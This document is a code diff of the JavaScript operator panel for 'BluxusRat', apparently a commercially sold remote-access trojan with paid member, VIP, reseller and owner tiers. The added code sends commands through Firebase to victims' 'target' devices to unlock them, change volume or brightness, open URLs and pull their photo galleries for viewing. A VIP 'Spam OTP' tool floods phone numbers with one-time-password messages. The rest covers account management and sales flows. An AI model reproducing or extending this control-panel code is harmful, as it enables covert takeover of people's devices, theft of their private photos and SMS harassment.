+      await sendCommand(t.id, "lock_off");
+      toast("Lock dibuka", "ok");
+    }
+  };
+}
+
+function setupVolumePage(t) {
+  const slider = $("#volume-slider");
+  const val = $("#volume-value");
+  slider.oninput = () => { val.textContent = slider.value + "%"; };
+  $("#btn-set-volume").onclick = async () => {
+    haptic(15);
+    const v = parseInt(slider.value);
+    await sendCommand(t.id, "set_volume", { value: v });
+    toast(`Volume di-set ${v}%`, "ok");
+  };
+}
+
+function setupBrightnessPage(t) {
+  const slider = $("#brightness-slider");
+  const val = $("#brightness-value");
+  slider.oninput = () => { val.textContent = slider.value + "%"; };
+  $("#btn-set-brightness").onclick = async () => {
+    haptic(15);
+    const v = parseInt(slider.value);
+    await sendCommand(t.id, "set_brightness", { value: v });
+    toast(`Kecerahan di-set ${v}%`, "ok");
+  };
+}
+
+function setupUrlPage(t) {
+  $("#btn-open-url").onclick = async () => {
+    haptic(15);
+    const url = $("#url-direct").value.trim();
+    if (!url) return toast("Isi URL dulu", "err");
+    if (!/^https?:\/\//.test(url)) return toast("URL harus diawali http:// atau https://", "err");
+    await sendCommand(t.id, "open_url", { url });
+    toast("URL dikirim ke target", "ok");
+  };
+}
+
+function setupGalleryPage(t) {
+  $("#btn-get-gallery").onclick = async () => {
+    haptic(15);
+    toast("Meminta galeri...", "info");
+    await sendCommand(t.id, "get_gallery");
+    const grid = $("#gallery-grid");
+    grid.innerHTML = '<div class="empty" style="grid-column:1/-1"><i class="fa-solid fa-spinner fa-spin"></i><div>Menunggu galeri dari target...</div></div>';
+    if (State.unsubGallery) State.unsubGallery();
+    State.unsubGallery = fbOnValue(fbRef(State.db, "gallery/" + t.id), (snap) => {
+      if (!snap.exists()) return;
+      const data = snap.val();
+      const photos = data.photos || [];
+      if (photos.length === 0) {
+        grid.innerHTML = '<div class="empty" style="grid-column:1/-1"><i class="fa-solid fa-image"></i><div>Belum ada foto</div></div>';
+        return;
+      }
+      grid.innerHTML = photos.map(url => `
+        <div class="g-item" onclick="window.open('${url}','_blank')">
+          <img src="${url}" onerror="this.style.background='var(--bg-card)'">
+        </div>
+      `).join("");
+    });
+  };
+}
+
+// ============================================================
+// COMMANDS
+// ============================================================
+async function sendCommand(tid, type, payload = {}) {
+  try {
+    const cmdRef = fbPush(fbRef(State.db, "commands/" + tid));
+    await fbSet(cmdRef, {
+      type, payload,
+      fromUid: State.uid,
+      status: "pending",
+      createdAt: Date.now()
+    });
+    return true;
+  } catch (e) {
+    toast("Gagal kirim command", "err");
+    return false;
+  }
 }
 
 // ============================================================
@@ -981,26 +1294,46 @@ const VIP_TOOLS = [
   { id: "otp", name: "Spam OTP", desc: "Blast OTP ke nomor", icon: "fa-bolt" }
 ];
 
-function goTools() {
+async function checkMaintenance() {
+  try {
+    const snap = await fbGet(fbRef(State.db, "maintenance"));
+    return snap.exists() ? snap.val() : {};
+  } catch (e) { return {}; }
+}
+
+async function goTools() {
   showScreen("tools");
   const g = $("#tools-grid");
   const vg = $("#vip-tools-grid");
-  g.innerHTML = TOOLS.map(t => `
-    <div class="tool-card" data-tool="${t.id}">
-      <div class="tc-icon"><i class="fa-solid ${t.icon}"></i></div>
-      <div class="tc-name">${t.name}</div>
-      <div class="tc-desc">${t.desc}</div>
-    </div>`).join("");
+  const maint = await checkMaintenance();
   const vip = isVIP();
-  vg.innerHTML = VIP_TOOLS.map(t => `
-    <div class="tool-card vip ${vip ? "" : "locked"}" data-tool="${t.id}">
-      <div class="tc-badge vip-badge">VIP</div>
-      <div class="tc-icon"><i class="fa-solid ${t.icon}"></i></div>
-      <div class="tc-name">${t.name}</div>
-      <div class="tc-desc">${t.desc}</div>
-    </div>`).join("");
+
+  g.innerHTML = TOOLS.map(t => {
+    const isMaint = maint[t.id]?.active;
+    return `
+      <div class="tool-card ${isMaint ? "maintenance" : ""}" data-tool="${t.id}" data-maint="${isMaint}">
+        <div class="tc-icon"><i class="fa-solid ${t.icon}"></i></div>
+        <div class="tc-name">${t.name}</div>
+        <div class="tc-desc">${isMaint ? (maint[t.id].message || "Sedang maintenance") : t.desc}</div>
+      </div>`;
+  }).join("");
+
+  vg.innerHTML = VIP_TOOLS.map(t => {
+    const isMaint = maint[t.id]?.active;
+    return `
+      <div class="tool-card vip ${vip ? "" : "locked"} ${isMaint ? "maintenance" : ""}" data-tool="${t.id}" data-maint="${isMaint}">
+        <div class="tc-badge vip-badge">VIP</div>
+        <div class="tc-icon"><i class="fa-solid ${t.icon}"></i></div>
+        <div class="tc-name">${t.name}</div>
+        <div class="tc-desc">${isMaint ? (maint[t.id].message || "Sedang maintenance") : t.desc}</div>
+      </div>`;
+  }).join("");
+
   $$(".tool-card").forEach(el => el.onclick = () => {
     haptic(10);
+    if (el.dataset.maint === "true") {
+      return toast("Fitur ini sedang maintenance", "warn");
+    }
     openTool(el.dataset.tool, el.classList.contains("locked"));
   });
 }
@@ -1015,9 +1348,6 @@ function openTool(id, locked) {
   if (id === "otp") return toolOTP();
 }
 
-// ============================================================
-// TOOL: TO LINK
-// ============================================================
 function toolToLink() {
   const box = $("#modal-box");
   box.innerHTML = `
@@ -1107,9 +1437,6 @@ async function handleUpload(file) {
   xhr.send(fd);
 }
 
-// ============================================================
-// TOOL: SPOTIFY
-// ============================================================
 function toolSpotify() {
   const box = $("#modal-box");
   box.innerHTML = `
@@ -1205,9 +1532,6 @@ function initPlayer() {
   };
 }
 
-// ============================================================
-// TOOL: GEMPA
-// ============================================================
 function toolGempa() {
   const box = $("#modal-box");
   box.innerHTML = `
@@ -1257,9 +1581,6 @@ async function loadGempa() {
   }
 }
 
-// ============================================================
-// TOOL: NGL
-// ============================================================
 function toolNGL() {
   const box = $("#modal-box");
   box.innerHTML = `
@@ -1325,9 +1646,6 @@ function toolNGL() {
   };
 }
 
-// ============================================================
-// TOOL: QR
-// ============================================================
 function toolQR() {
   const box = $("#modal-box");
   box.innerHTML = `
@@ -1375,9 +1693,6 @@ function toolQR() {
   };
 }
 
-// ============================================================
-// TOOL: SPAM OTP
-// ============================================================
 function toolOTP() {
   const box = $("#modal-box");
   box.innerHTML = `
@@ -1538,6 +1853,194 @@ function addConsole(type, msg) {
 }
 
 // ============================================================
+// BENEFIT ROLE
+// ============================================================
+function goBenefit() {
+  showScreen("benefit");
+  renderRoleCards();
+  renderFAQ();
+}
+
+function renderRoleCards() {
+  const container = $("#role-cards");
+  const order = ["owner", "reseller", "vip", "member"];
+  container.innerHTML = order.map(key => {
+    const r = PRICE_DATA[key];
+    return `
+      <div class="role-card ${key}">
+        <div class="rc-head">
+          <div class="rc-icon"><i class="fa-solid ${r.icon}"></i></div>
+          <div class="rc-info">
+            <div class="rc-name">${r.label}</div>
+            <div class="rc-tagline">${r.tagline}</div>
+          </div>
+        </div>
+        <div class="rc-desc">${r.desc}</div>
+        <div class="rc-benefits">
+          ${r.benefits.map(b => `<div class="rc-benefit"><i class="fa-solid fa-check"></i><span>${b}</span></div>`).join("")}
+        </div>
+      </div>`;
+  }).join("");
+}
+
+function renderFAQ() {
+  const list = $("#faq-list");
+  list.innerHTML = FAQ_DATA.map((f, i) => `
+    <div class="faq-item" data-faq="${i}">
+      <div class="faq-q">
+        <span>${f.q}</span>
+        <i class="fa-solid fa-chevron-right arrow"></i>
+      </div>
+      <div class="faq-a">${f.a}</div>
+    </div>
+  `).join("");
+  $$(".faq-item").forEach(item => {
+    item.querySelector(".faq-q").onclick = () => {
+      haptic(8);
+      item.classList.toggle("open");
+    };
+  });
+}
+
+// ============================================================
+// BELI AKSES
+// ============================================================
+function goBuy() {
+  State.buy = { role: null, days: null, price: null, label: null };
+  showScreen("buy");
+  setBuyStep(1);
+  renderBuyRoles();
+  $("#buy-username").value = "";
+  $("#buy-email").value = "";
+}
+
+function setBuyStep(n) {
+  $$(".buy-step").forEach(s => s.classList.remove("active"));
+  const step = $("#buy-step-" + n);
+  if (step) step.classList.add("active");
+  $$(".stepper .step").forEach(s => {
+    const sn = parseInt(s.dataset.step);
+    s.classList.toggle("active", sn === n);
+    s.classList.toggle("done", sn < n);
+  });
+}
+
+function renderBuyRoles() {
+  const grid = $("#buy-role-grid");
+  const order = ["member", "vip", "reseller", "owner"];
+  grid.innerHTML = order.map(key => {
+    const r = PRICE_DATA[key];
+    const minPrice = Math.min(...r.options.map(o => o.price));
+    return `
+      <div class="role-opt" data-role="${key}">
+        <div class="ro-icon"><i class="fa-solid ${r.icon}"></i></div>
+        <div class="ro-name">${r.label}</div>
+        <div class="ro-price">Mulai ${fmtPrice(minPrice)}</div>
+      </div>`;
+  }).join("");
+  $$(".role-opt").forEach(el => {
+    el.onclick = () => {
+      haptic(10);
+      $$(".role-opt").forEach(x => x.classList.remove("selected"));
+      el.classList.add("selected");
+      State.buy.role = el.dataset.role;
+      $("#btn-buy-next-1").disabled = false;
+    };
+  });
+}
+
+function renderBuyDurations() {
+  const r = PRICE_DATA[State.buy.role];
+  $("#buy-role-selected").innerHTML = `<i class="fa-solid ${r.icon}"></i> Role dipilih: <b>${r.label}</b>`;
+  const grid = $("#buy-duration-grid");
+  grid.innerHTML = r.options.map((o, i) => `
+    <div class="duration-opt" data-idx="${i}">
+      <span class="do-label">${o.label}</span>
+      <span class="do-price">${fmtPrice(o.price)}</span>
+    </div>
+  `).join("");
+  $$(".duration-opt").forEach(el => {
+    el.onclick = () => {
+      haptic(10);
+      $$(".duration-opt").forEach(x => x.classList.remove("selected"));
+      el.classList.add("selected");
+      const idx = parseInt(el.dataset.idx);
+      const opt = r.options[idx];
+      State.buy.days = opt.days;
+      State.buy.price = opt.price;
+      State.buy.label = opt.label;
+      $("#btn-buy-next-2").disabled = false;
+    };
+  });
+  $("#btn-buy-next-2").disabled = true;
+}
+
+function validateBuyData() {
+  const usn = $("#buy-username").value.trim();
+  const email = $("#buy-email").value.trim();
+  const validEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
+  $("#btn-buy-next-3").disabled = !(usn.length >= 3 && validEmail);
+}
+
+async function submitOrder() {
+  const usn = $("#buy-username").value.trim();
+  const email = $("#buy-email").value.trim();
+  const orderId = genOrderId();
+
+  const orderData = {
+    orderId,
+    role: State.buy.role,
+    roleLabel: PRICE_DATA[State.buy.role].label,
+    duration: State.buy.days,
+    durationLabel: State.buy.label,
+    price: State.buy.price,
+    username: usn,
+    email: email,
+    status: "pending",
+    createdAt: Date.now(),
+    verifiedAt: null,
+    verifiedBy: null,
+    note: ""
+  };
+
+  try {
+    await fbSet(fbRef(State.db, "orders/" + orderId), orderData);
+    State.order.current = orderData;
+
+    $("#order-detail").innerHTML = `
+      <div class="od-id">
+        <div class="lbl">Order ID</div>
+        <div class="id">${orderId}</div>
+      </div>
+      <div class="od-row highlight"><span class="l">Role</span><span class="v">${orderData.roleLabel}</span></div>
+      <div class="od-row"><span class="l">Durasi</span><span class="v">${orderData.durationLabel}</span></div>
+      <div class="od-row"><span class="l">Harga</span><span class="v">${fmtPrice(orderData.price)}</span></div>
+      <div class="od-row"><span class="l">Username</span><span class="v">${usn}</span></div>
+      <div class="od-row"><span class="l">Email</span><span class="v">${email}</span></div>
+    `;
+    setBuyStep(4);
+  } catch (e) {
+    toast("Gagal kirim pesanan: " + e.message, "err");
+  }
+}
+
+function bayarOrder() {
+  const o = State.order.current;
+  if (!o) return;
+  const msg = encodeURIComponent(
+    `Halo Admin, saya mau bayar pesanan akses BluxusRat.\n\n` +
+    `Order ID: ${o.orderId}\n` +
+    `Role: ${o.roleLabel}\n` +
+    `Durasi: ${o.durationLabel}\n` +
+    `Harga: ${fmtPrice(o.price)}\n` +
+    `Username: ${o.username}\n` +
+    `Email: ${o.email}\n\n` +
+    `Berikut saya lampirkan struk pembayaran.`
+  );
+  window.open(`https://wa.me/${CONFIG.WA_ADMIN}?text=${msg}`, "_blank");
+}
+
+// ============================================================
 // ACCOUNT
 // ============================================================
 function goAccount() {
@@ -1547,7 +2050,7 @@ function goAccount() {
   const r = $("#acc-role");
   const role = u.role || "member";
   r.textContent = role;
-  r.className = "urole " + (role === "vip" ? "vip" : role === "reseller" ? "reseller" : role === "owner" ? "owner" : "");
+  r.className = "urole " + role;
   $("#acc-usercode").textContent = u.userCode || "—";
   $("#acc-created").textContent = u.createdAt ? fmtDate(u.createdAt) : "—";
   if (u.avatar) $("#acc-avatar").src = u.avatar;
@@ -1559,36 +2062,19 @@ function goAccount() {
 function goPanel() {
   const u = State.user || {};
   const role = u.role || "member";
+  const perms = ROLE_PERMS[role] || { panel: [] };
   showScreen("panel");
   $("#panel-title").textContent = `${role.charAt(0).toUpperCase() + role.slice(1)} Panel`;
   $("#panel-role-text").textContent = `${role.toUpperCase()} PANEL`;
-  const items = {
-    owner: [
-      ["fa-user-plus", "Add User"],
-      ["fa-users-gear", "Manage User"],
-      ["fa-ban", "Ban User"],
-      ["fa-key", "Reset Password"],
-      ["fa-bullhorn", "Broadcast"],
-      ["fa-chart-line", "Statistics"],
-      ["fa-database", "Database"]
-    ],
-    reseller: [
-      ["fa-user-plus", "Add Member"],
-      ["fa-users-gear", "Manage Member"],
-      ["fa-clock-rotate-left", "Extend Member"]
-    ],
-    vip: [],
-    member: []
-  };
-  const arr = items[role] || [];
-  if (arr.length === 0) {
+
+  if (!perms.panel.length) {
     $("#panel-grid").innerHTML = '<div style="text-align:center;color:var(--text-mute);font-size:12px;padding:20px;grid-column:1/-1">Belum ada fitur panel untuk role ini</div>';
     return;
   }
-  $("#panel-grid").innerHTML = arr.map(([ic, txt]) => `
-    <div class="panel-action" data-action="${txt}">
-      <div class="ico-badge"><i class="fa-solid ${ic}"></i></div>
-      <div class="txt">${txt}</div>
+  $("#panel-grid").innerHTML = perms.panel.map(p => `
+    <div class="panel-action" data-action="${p.id}">
+      <div class="ico-badge"><i class="fa-solid ${p.icon}"></i></div>
+      <div class="txt">${p.name}</div>
     </div>`).join("");
   $$(".panel-action").forEach(el => el.onclick = () => {
     haptic(10);
@@ -1599,175 +2085,156 @@ function goPanel() {
 function openPanelAction(action) {
   const box = $("#modal-box");
   const forms = {
-    "Add User": `
+    add_user: `
+      <h3>Tambah Akun</h3>
       <div class="field"><label>Username</label><input id="f-usn" placeholder="username"></div>
       <div class="field"><label>Password</label><input type="password" id="f-pw" placeholder="min 6 karakter"></div>
-      <div class="field"><label>Role</label><select id="f-role"><option value="member">Member</option><option value="vip">VIP</option><option value="reseller">Reseller</option></select></div>
+      <div class="field"><label>Role</label><select id="f-role">${(CREATE_PERMS[State.user.role] || []).map(r => `<option value="${r}">${r.charAt(0).toUpperCase() + r.slice(1)}</option>`).join("")}</select></div>
       <div class="field"><label>Masa Aktif</label><select id="f-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option><option value="">Unlimited</option></select></div>
-      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-plus"></i> Buat Akun</button>`,
-    "Add Member": `
-      <div class="field"><label>Username</label><input id="f-usn" placeholder="username"></div>
-      <div class="field"><label>Password</label><input type="password" id="f-pw" placeholder="min 6 karakter"></div>
-      <div class="field"><label>Masa Aktif</label><select id="f-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option></select></div>
-      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-plus"></i> Buat</button>`,
-    "Manage User": `
-      <div class="field"><label>Cari</label><input id="f-search" placeholder="username..."></div>
-      <div id="user-list"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div></div>`,
-    "Manage Member": `
-      <div class="field"><label>Cari</label><input id="f-search" placeholder="username..."></div>
-      <div id="user-list"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div></div>`,
-    "Ban User": `
+      <button class="btn btn-primary" id="btn-submit-add">Buat Akun</button>
+      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
+    extend_user: `
+      <h3>Perpanjang Akun</h3>
+      <div class="field"><label>Username</label><input id="f-ext-usn" placeholder="username"></div>
+      <div class="field"><label>Tambah Hari</label><select id="f-ext-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option><option value="365">365 Hari</option></select></div>
+      <button class="btn btn-primary" id="btn-submit-ext">Perpanjang</button>
+      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
+    manage_user: `
+      <h3>Manage User</h3>
+      <div class="field"><input id="f-search" placeholder="Cari username..."></div>
+      <div id="user-list"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div></div>
+      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
+    ban_user: `
+      <h3>Ban User</h3>
       <div class="field"><label>Username</label><input id="f-ban-usn" placeholder="username"></div>
-      <button class="btn btn-danger" id="btn-submit-action"><i class="fa-solid fa-ban"></i> Ban</button>`,
-    "Reset Password": `
+      <button class="btn btn-danger" id="btn-submit-ban">Ban</button>
+      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
+    reset_pw: `
+      <h3>Reset Password</h3>
       <div class="field"><label>Username</label><input id="f-reset-usn" placeholder="username"></div>
-      <div class="field"><label>Password Baru</label><input type="password" id="f-reset-pw"></div>
-      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-key"></i> Reset</button>`,
-    "Broadcast": `
-      <div class="field"><label>Judul</label><input id="f-bc-title"></div>
-      <div class="field"><label>Pesan</label><textarea id="f-bc-msg"></textarea></div>
-      <div class="field"><label>Gambar URL</label><input id="f-bc-img" placeholder="https://..."></div>
-      <div class="field"><label>Link URL</label><input id="f-bc-url" placeholder="https://..."></div>
-      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-bullhorn"></i> Kirim</button>`,
-    "Statistics": `<div id="stat-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>`,
-    "Database": `<div id="db-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>`,
-    "Extend Member": `
-      <div class="field"><label>Username</label><input id="f-ext-usn"></div>
-      <div class="field"><label>Tambah Hari</label><select id="f-ext-days"><option value="1">1 Hari</option><option value="7">7 Hari</option><option value="30" selected>30 Hari</option></select></div>
-      <button class="btn btn-primary" id="btn-submit-action"><i class="fa-solid fa-clock-rotate-left"></i> Perpanjang</button>`
+      <div class="field"><label>Password Baru</label><input type="password" id="f-reset-pw" placeholder="min 6 karakter"></div>
+      <button class="btn btn-primary" id="btn-submit-reset">Reset</button>
+      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
+    broadcast: `
+      <h3>Broadcast</h3>
+      <div class="field"><label>Judul</label><input id="f-bc-title" placeholder="Judul"></div>
+      <div class="field"><label>Pesan</label><textarea id="f-bc-msg" placeholder="Tulis pesan..."></textarea></div>
+      <div class="field"><label>Gambar URL (opsional)</label><input id="f-bc-img" placeholder="https://..."></div>
+      <div class="field"><label>Link URL (opsional)</label><input id="f-bc-url" placeholder="https://..."></div>
+      <button class="btn btn-primary" id="btn-submit-bc">Kirim</button>
+      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
+    stats: `<div id="stat-content"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>`,
+    maintenance: `
+      <h3>Maintenance Fitur</h3>
+      <div id="maint-list"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>
+      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`,
+    logs: `
+      <h3>Server Logs</h3>
+      <div id="logs-content" style="max-height:60vh;overflow-y:auto"><div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Loading...</div></div>
+      <div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`
   };
-  box.innerHTML = `<h3>${action}</h3>` + (forms[action] || '<div class="sub">Coming soon.</div>') + `<div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>`;
+  box.innerHTML = forms[action] || '<h3>Coming soon</h3><div class="modal-actions"><button class="btn btn-ghost" onclick="closeModal()">Tutup</button></div>';
   $("#modal").classList.add("show");
-  const btn = $("#btn-submit-action");
-  
-  if (action === "Add User" || action === "Add Member") {
-    btn.onclick = async () => {
-      haptic(15);
-      const usn = $("#f-usn").value.trim();
-      const pw = $("#f-pw").value;
-      const role = action === "Add Member" ? "member" : ($("#f-role")?.value || "member");
-      const days = $("#f-days").value;
-      if (!usn || !pw) return toast("Isi semua", "err");
-      if (pw.length < 6) return toast("Password min 6", "err");
-      try {
-        const usersSnap = await fbGet(fbRef(State.db, "users"));
-        const users = usersSnap.exists() ? usersSnap.val() : {};
-        for (const uid in users) {
-          if (users[uid].username === usn) return toast("Username udah dipake", "err");
-        }
-        const salt = genSalt();
-        const hash = await sha256(pw + salt);
-        const userCode = genUserCode();
-        const newRef = fbPush(fbRef(State.db, "users"));
-        await fbSet(newRef, {
-          username: usn,
-          passwordHash: hash,
-          passwordSalt: salt,
-          role, userCode,
-          createdBy: State.uid,
-          createdAt: Date.now(),
-          expiresAt: days ? Date.now() + parseInt(days) * 86400000 : null,
-          banned: false, avatar: ""
-        });
-        toast(`Akun ${usn} dibuat. Code: ${userCode}`, "ok", 6000);
-        closeModal();
-      } catch (e) {
-        toast("Gagal: " + e.message, "err");
-      }
-    };
-  }
-  
-  if (action === "Ban User") {
-    btn.onclick = async () => {
-      haptic(15);
-      const usn = $("#f-ban-usn").value.trim();
-      if (!usn) return toast("Isi", "err");
-      const s = await fbGet(fbRef(State.db, "users"));
-      const u = s.val() || {};
-      for (const uid in u) {
-        if (u[uid].username === usn) {
-          await fbUpdate(fbRef(State.db, "users/" + uid), { banned: true });
-          toast(`User ${usn} di-ban`, "ok");
-          closeModal();
-          return;
-        }
-      }
-      toast("Gak ada", "err");
-    };
-  }
-  
-  if (action === "Reset Password") {
-    btn.onclick = async () => {
-      haptic(15);
-      const usn = $("#f-reset-usn").value.trim();
-      const pw = $("#f-reset-pw").value;
-      if (!usn || !pw) return toast("Isi", "err");
-      if (pw.length < 6) return toast("Min 6", "err");
-      const s = await fbGet(fbRef(State.db, "users"));
-      const u = s.val() || {};
-      for (const uid in u) {
-        if (u[uid].username === usn) {
-          const salt = genSalt();
-          const hash = await sha256(pw + salt);
-          await fbUpdate(fbRef(State.db, "users/" + uid), { passwordHash: hash, passwordSalt: salt });
-          toast("Direset", "ok");
-          closeModal();
-          return;
-        }
-      }
-      toast("Gak ada", "err");
-    };
-  }
-  
-  if (action === "Extend Member") {
-    btn.onclick = async () => {
-      haptic(15);
-      const usn = $("#f-ext-usn").value.trim();
-      const days = parseInt($("#f-ext-days").value);
-      if (!usn) return toast("Isi", "err");
-      const s = await fbGet(fbRef(State.db, "users"));
-      const u = s.val() || {};
-      for (const uid in u) {
-        if (u[uid].username === usn) {
-          const base = u[uid].expiresAt && u[uid].expiresAt > Date.now() ? u[uid].expiresAt : Date.now();
-          await fbUpdate(fbRef(State.db, "users/" + uid), { expiresAt: base + days * 86400000 });
-          toast(`+${days} hari`, "ok");
-          closeModal();
-          return;
-        }
-      }
-      toast("Gak ada", "err");
-    };
-  }
-  
-  if (action === "Broadcast") {
-    btn.onclick = async () => {
-      haptic(15);
-      const title = $("#f-bc-title").value.trim();
-      const msg = $("#f-bc-msg").value.trim();
-      const img = $("#f-bc-img").value.trim();
-      const url = $("#f-bc-url").value.trim();
-      if (!msg) return toast("Isi pesan", "err");
-      const bRef = fbPush(fbRef(State.db, "broadcasts"));
-      await fbSet(bRef, { title, message: msg, image: img, url, fromUid: State.uid, createdAt: Date.now() });
-      toast("Terkirim", "ok");
-      closeModal();
-    };
-  }
-  
-  if (action === "Manage User" || action === "Manage Member") {
-    const s = $("#f-search");
-    s.oninput = () => {
-      clearTimeout(window._st);
-      window._st = setTimeout(() => searchUsers(s.value, action), 400);
-    };
-  }
-  
-  if (action === "Statistics") loadStats();
-  if (action === "Database") loadDB();
+
+  if (action === "add_user") bindAddUser();
+  if (action === "extend_user") bindExtendUser();
+  if (action === "manage_user") bindManageUser();
+  if (action === "ban_user") bindBanUser();
+  if (action === "reset_pw") bindResetPw();
+  if (action === "broadcast") bindBroadcast();
+  if (action === "stats") loadStats();
+  if (action === "maintenance") loadMaintenance();
+  if (action === "logs") loadLogs();
 }
 
-async function searchUsers(q, action) {
+function bindAddUser() {
+  $("#btn-submit-add").onclick = async () => {
+    haptic(15);
+    const usn = $("#f-usn").value.trim();
+    const pw = $("#f-pw").value;
+    const role = $("#f-role").value;
+    const days = $("#f-days").value;
+    if (!usn || !pw) return toast("Isi semua field", "err");
+    if (pw.length < 6) return toast("Password min 6 karakter", "err");
+
+    const limit = DAILY_LIMIT[State.user.role];
+    if (limit !== null) {
+      const today = new Date().toISOString().slice(0, 10);
+      const counterKey = `daily_counter/${State.uid}/${today}`;
+      const snap = await fbGet(fbRef(State.db, counterKey));
+      const current = snap.exists() ? snap.val() : 0;
+      if (current >= limit) return toast(`Limit harian tercapai (${limit}/hari)`, "err");
+    }
+
+    try {
+      const usersSnap = await fbGet(fbRef(State.db, "users"));
+      const users = usersSnap.exists() ? usersSnap.val() : {};
+      for (const uid in users) {
+        if (users[uid].username === usn) return toast("Username udah dipake", "err");
+      }
+
+      const salt = genSalt();
+      const hash = await sha256(pw + salt);
+      const userCode = genUserCode();
+      const newRef = fbPush(fbRef(State.db, "users"));
+      await fbSet(newRef, {
+        username: usn,
+        passwordHash: hash,
+        passwordSalt: salt,
+        role, userCode,
+        createdBy: State.uid,
+        createdAt: Date.now(),
+        expiresAt: days ? Date.now() + parseInt(days) * 86400000 : null,
+        banned: false, avatar: ""
+      });
+
+      if (limit !== null) {
+        const today = new Date().toISOString().slice(0, 10);
+        const counterKey = `daily_counter/${State.uid}/${today}`;
+        await fbSet(fbRef(State.db, counterKey), (current + 1));
+      }
+
+      toast(`Akun ${usn} dibuat. Code: ${userCode}`, "ok", 6000);
+      closeModal();
+    } catch (e) {
+      toast("Gagal: " + e.message, "err");
+    }
+  };
+}
+
+function bindExtendUser() {
+  $("#btn-submit-ext").onclick = async () => {
+    haptic(15);
+    const usn = $("#f-ext-usn").value.trim();
+    const days = parseInt($("#f-ext-days").value);
+    if (!usn) return toast("Isi username", "err");
+    const s = await fbGet(fbRef(State.db, "users"));
+    const u = s.val() || {};
+    for (const uid in u) {
+      if (u[uid].username === usn) {
+        if (State.user.role !== "dev" && u[uid].createdBy !== State.uid) {
+          return toast("Gak bisa perpanjang akun ini", "err");
+        }
+        const base = u[uid].expiresAt && u[uid].expiresAt > Date.now() ? u[uid].expiresAt : Date.now();
+        await fbUpdate(fbRef(State.db, "users/" + uid), { expiresAt: base + days * 86400000 });
+        toast(`+${days} hari buat ${usn}`, "ok");
+        closeModal();
+        return;
+      }
+    }
+    toast("User gak ditemukan", "err");
+  };
+}
+
+function bindManageUser() {
+  const s = $("#f-search");
+  s.oninput = () => {
+    clearTimeout(window._st);
+    window._st = setTimeout(() => searchUsers(s.value), 400);
+  };
+}
+
+async function searchUsers(q) {
   const list = $("#user-list");
   if (!q) {
     list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Ketik untuk cari</div>';
@@ -1780,11 +2247,11 @@ async function searchUsers(q, action) {
     for (const uid in users) {
       const u = users[uid];
       if (u.username.toLowerCase().includes(q.toLowerCase())) {
-        if (action === "Manage Member" && u.role !== "member") continue;
+        if (State.user.role !== "dev" && u.createdBy !== State.uid) continue;
         results.push({ uid, ...u });
       }
     }
-    if (results.length === 0) {
+    if (!results.length) {
       list.innerHTML = '<div style="text-align:center;color:var(--text-dim);font-size:12px;padding:20px">Gak ditemukan</div>';
       return;
     }
@@ -1799,55 +2266,411 @@ async function searchUsers(q, action) {
   } catch (e) {}
 }
 
+function bindBanUser() {
+  $("#btn-submit-ban").onclick = async () => {
+    haptic(15);
+    const usn = $("#f-ban-usn").value.trim();
+    if (!usn) return toast("Isi username", "err");
+    const s = await fbGet(fbRef(State.db, "users"));
+    const u = s.val() || {};
+    for (const uid in u) {
+      if (u[uid].username === usn) {
+        await fbUpdate(fbRef(State.db, "users/" + uid), { banned: true });
+        toast(`User ${usn} di-ban`, "ok");
+        closeModal();
+        return;
+      }
+    }
+    toast("User gak ditemukan", "err");
+  };
+}
+
+function bindResetPw() {
+  $("#btn-submit-reset").onclick = async () => {
+    haptic(15);
+    const usn = $("#f-reset-usn").value.trim();
+    const pw = $("#f-reset-pw").value;
+    if (!usn || !pw) return toast("Isi semua", "err");
+    if (pw.length < 6) return toast("Min 6 karakter", "err");
+    const s = await fbGet(fbRef(State.db, "users"));
+    const u = s.val() || {};
+    for (const uid in u) {
+      if (u[uid].username === usn) {
+        const salt = genSalt();
+        const hash = await sha256(pw + salt);
+        await fbUpdate(fbRef(State.db, "users/" + uid), { passwordHash: hash, passwordSalt: salt });
+        toast(`Password ${usn} direset`, "ok");
+        closeModal();
+        return;
+      }
+    }
+    toast("User gak ditemukan", "err");
+  };
+}
+
+function bindBroadcast() {
+  $("#btn-submit-bc").onclick = async () => {
+    haptic(15);
+    const title = $("#f-bc-title").value.trim();
+    const msg = $("#f-bc-msg").value.trim();
+    const img = $("#f-bc-img").value.trim();
+    const url = $("#f-bc-url").value.trim();
+    if (!msg) return toast("Isi pesan", "err");
+    try {
+      const bRef = fbPush(fbRef(State.db, "broadcasts"));
+      await fbSet(bRef, { title, message: msg, image: img, url, fromUid: State.uid, createdAt: Date.now() });
+      toast("Broadcast terkirim", "ok");
+      closeModal();
+    } catch (e) {
+      toast("Gagal: " + e.message, "err");
+    }
+  };
